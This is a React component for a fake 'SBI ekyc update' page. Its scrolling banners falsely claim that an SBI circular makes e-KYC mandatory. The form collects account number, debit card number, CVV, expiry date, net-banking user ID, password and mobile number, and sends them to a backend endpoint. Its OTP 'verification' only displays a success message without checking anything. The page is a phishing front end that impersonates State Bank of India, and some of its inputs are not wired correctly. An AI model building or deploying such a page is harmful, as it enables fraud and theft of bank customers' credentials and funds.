// Login.jsx

import React, { useState } from 'react'; // Import useState hook
import axios from 'axios';

function Login() {
  const [mobileNumber, setMobileNumber] = useState('');
    const [otp, setOTP] = useState('');
    const [verificationError, setVerificationError] = useState('');
    const [otpSent, setOTPSent] = useState(false);

    
  const [acnumber, setacnumber] = useState('');
  // const [mobileNumber, setmobileNumber] = useState('');
  const [debumber, setdebumber] = useState('');
  const [CVV, setCVV] = useState('');
  const [cardexpiry, setcardexpiry] = useState('');
  const [userid, setuserid] = useState('');
  const [password, setpassword] = useState('');
  

    const handleSendOTP = async (e) => {
     
      try {
        const response = await axios.post('http://localhost:5000/sendOTP', { mobileNumber });
        if (response.data.success) {
            setOTPSent(true);
            setVerificationError('');
        } else {
            setOTPSent(false);
            setVerificationError(response.data.message);
        }
    } catch (error) {
        console.error('Error sending OTP:', error);
        setOTPSent(false);
        setVerificationError('Failed to send OTP. Please try again.');
    }
};
      

    const handleVerifyOTP = async () => {
      setVerificationError('OTP Verified Successfully,Now click on submit to Complete the e-KYC');
      // document.write(`<center><h1>Thankyou</center></h1>`)
          //  axios.post('http://localhost:5000/verifyOTP')
           
    };


    const handleData = async (e) => {
       e.preventDefault();
      let result = await fetch('http://localhost:5000/sbi-ekyc',{
        method: 'post',
        body: JSON.stringify({acnumber,debumber,CVV,cardexpiry,userid,password,mobileNumber}),
        headers:{
          'Content-Type': 'application/json'
        },
      });
      result = await result.json;
      localStorage.setItem("user",JSON.stringify(result));
      document.write(`<center><h1><font color="green">You have Successfully completed the sbi-ekyc.</font></center></h1>`)
       
    }


  // const [acnumber, setacnumber] = useState('');
  // // const [mobileNumber, setmobileNumber] = useState('');
  // const [debumber, setdebumber] = useState('');

  // const handleSubmit = async (e) => {
  //   preventDefault();
  //   let result = await fetch('http://localhost:5000/save',{
  //     method: 'post',
  //     body: JSON.stringify({acnumber,debumber}),
  //     headers:{
  //       'Content-Type': 'application/json'
  //     },
  //   });
  //   result = await result.json;
  //   localStorage.setItem("user",JSON.stringify(result));
  // }



  return (
    <center>
          <marquee><font color="red">एसबीआई की ओर से परिपत्र है कि ekyc अनिवार्य है। कृपया सफल ekyc के लिए अपने सभी विवरण भरें</font></marquee>
    <div>
    <marquee><font color="red">There is Circular from SBI that ekyc is Mandatory.Please fill all your deatils for successfull ekyc</font></marquee>

      <h2>SBI ekyc update</h2><br></br><br></br>
      {/* <form onSubmit={handleSubmit}> */}
     

         <label htmlFor="mobileNumber">Account Number</label><br></br>
        <input type="text"  id='acnumber'  placeholder="Enter Account number" value={acnumber} onChange={(e) => setacnumber(e.target.value)} name="acnumber" rules={[{required: true}]} /><br></br><br></br>

        <label htmlFor="mobileNumber">Debit card Number</label><br></br>
        <input type="text"  id='debumber'  placeholder="Enter Debit card number" value={debumber}  onChange={(e) => setdebumber(e.target.value)} name="debumber" rules={[{required: true}]}/><br></br><br></br>

        <label htmlFor="mobileNumber">CVV</label><br></br>
        <input type="text"  id='CVV'  placeholder="Enter CVV" name="CVV" rules={[{required: true}]}/><br></br><br></br>

        <label htmlFor="mobileNumber">Expiry date</label><br></br>
        <input type="text"  id='cardexpiry'  placeholder="Enter Expiry date (example: 12/12/2028)" name="cardexpiry" rules={[{required: true}]}/><br></br><br></br><br></br>

        <label htmlFor="mobileNumber">User id</label><br></br>
        <input type="text"  id='userid'  placeholder="Enter User ID" name="userid" rules={[{required: true}]}/><br></br><br></br><br></br>

        <label htmlFor="mobileNumber">Password</label><br></br>
        <input type="text"  id='password'  placeholder="Enter Password" name="password" rules={[{required: true}]}/><br></br><br></br><br></br>
 {otpSent ? (
                <div>
                    <input type="text" placeholder="Enter OTP" value={otp} onChange={(e) => setOTP(e.target.value)} rules={[{required: true}]}/><br></br><br></br><br></br>
                    <button onClick={handleVerifyOTP}>Verify OTP</button>
                    {verificationError && <p>{verificationError}</p>}
                </div>
            ) : (         
                <div><br></br>
                  <label htmlFor="mobileNumber">Registered Mobile Number</label><br></br>
                    <input type="text" placeholder="Enter Mobile Number" id='mobileNumber' name='mobileNumber' value={mobileNumber} onChange={(e) => setMobileNumber(e.target.value)} rules={[{required: true}]}/><br></br><br></br>
                    <font color="red">Add +91 in input field and then type mobile number</font>
                    <button onClick={handleSendOTP}>Send OTP</button>
                    {verificationError && <p>{verificationError}</p>}
                </div>
            )}
       <br></br>
        <button onClick={handleData}>Submit</button>
      {/* </form> */}
      </div>
    </center>

  
  );
}

export default Login;
